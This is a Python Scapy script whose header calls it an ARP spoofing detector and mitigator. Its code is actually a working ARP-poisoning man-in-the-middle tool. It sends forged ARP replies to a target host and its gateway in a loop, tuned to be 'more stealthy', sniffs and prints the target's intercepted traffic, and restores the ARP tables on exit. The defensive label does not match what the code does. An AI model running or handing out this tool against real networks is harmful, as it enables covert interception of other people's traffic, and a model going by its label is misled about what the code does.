#!/usr/bin/env python3
# -*- coding: utf-8 -*-
""" 
ARP Spoofing Detector/Mitigator v2.3
Enhanced with:
- Thread-safe packet handling
- Auto-restore on failure
- Network state validation
"""

from scapy.all import *
import os
import time
import sys
import threading
import signal
import atexit

# Configuration - Set these for your environment
INTERFACE = "enp3s0"
TARGET_IP = "192.168.1.2"
GATEWAY_IP = "192.168.1.1"
PACKET_COUNT = 1000
POISON_INTERVAL = 1.5  # More stealthy than 2 seconds

# State tracking
original_arp = {}
is_poisoning = True

def validate_environment():
    """Ensure proper permissions and environment"""
    if os.geteuid() != 0:
        print("[!] Must run as root for raw socket access")
        sys.exit(1)
        
    if INTERFACE not in get_if_list():
        print(f"[!] Interface {INTERFACE} not found")
        sys.exit(1)

def restore_network():
    """Safely restore ARP tables using cached values"""
    print("\n[!] Restoring network state...")
    if original_arp.get('gateway_mac') and original_arp.get('target_mac'):
        send(ARP(op=2, 
                psrc=GATEWAY_IP,
                hwsrc=original_arp['gateway_mac'],
                pdst=TARGET_IP,
                hwdst=original_arp['target_mac']),
             verbose=0)
        
        send(ARP(op=2,
                psrc=TARGET_IP,
                hwsrc=original_arp['target_mac'],
                pdst=GATEWAY_IP,
                hwdst=original_arp['gateway_mac']),
             verbose=0)
    
    sys.exit(0)

def get_mac(ip_address):
    """Robust MAC address resolution with validation"""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),
                     timeout=2, retry=3, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except Exception as e:
        print(f"[!] MAC resolution failed for {ip_address}: {str(e)}")
        return None

def poison_target():
    """Controlled ARP poisoning with state validation"""
    global is_poisoning
    print(f"[*] Beginning ARP poisoning (Interval: {POISON_INTERVAL}s)")
    
    poison_gateway = ARP(op=2, psrc=TARGET_IP, pdst=GATEWAY_IP,
                        hwdst=original_arp['gateway_mac'])
    poison_target = ARP(op=2, psrc=GATEWAY_IP, pdst=TARGET_IP,
                       hwdst=original_arp['target_mac'])

    while is_poisoning:
        try:
            send(poison_gateway, verbose=0)
            send(poison_target, verbose=0)
            time.sleep(POISON_INTERVAL)
        except KeyboardInterrupt:
            is_poisoning = False
            break
        except Exception as e:
            print(f"[!] Poisoning error: {str(e)}")
            restore_network()
    
    print("[*] ARP poisoning stopped")

def packet_callback(packet):
    """Process captured packets"""
    if packet.haslayer(IP):
        print(f"[*] Intercepted {packet[IP].src} -> {packet[IP].dst}")

def start_sniffer():
    """Packet capture with BPF filtering"""
    try:
        print(f"[*] Sniffing {PACKET_COUNT} packets...")
        sniff(filter=f"ip host {TARGET_IP}", 
              count=PACKET_COUNT,
              iface=INTERFACE,
              prn=packet_callback)
    except Exception as e:
        print(f"[!] Capture failed: {str(e)}")
        restore_network()

if __name__ == "__main__":
    validate_environment()
    atexit.register(restore_network)
    signal.signal(signal.SIGINT, lambda s,f: restore_network())

    # Initialize network state
    conf.iface = INTERFACE
    conf.verb = 0

    print(f"[*] Resolving MAC addresses...")
    original_arp['gateway_mac'] = get_mac(GATEWAY_IP)
    original_arp['target_mac'] = get_mac(TARGET_IP)

    if not all(original_arp.values()):
        print("[!] Failed to resolve required MAC addresses")
        sys.exit(1)

    # Start poisoning thread
    poison_thread = threading.Thread(target=poison_target)
    poison_thread.daemon = True
    poison_thread.start()

    # Start packet capture
    try:
        start_sniffer()
    finally:
        is_poisoning = False
        poison_thread.join()
        restore_network()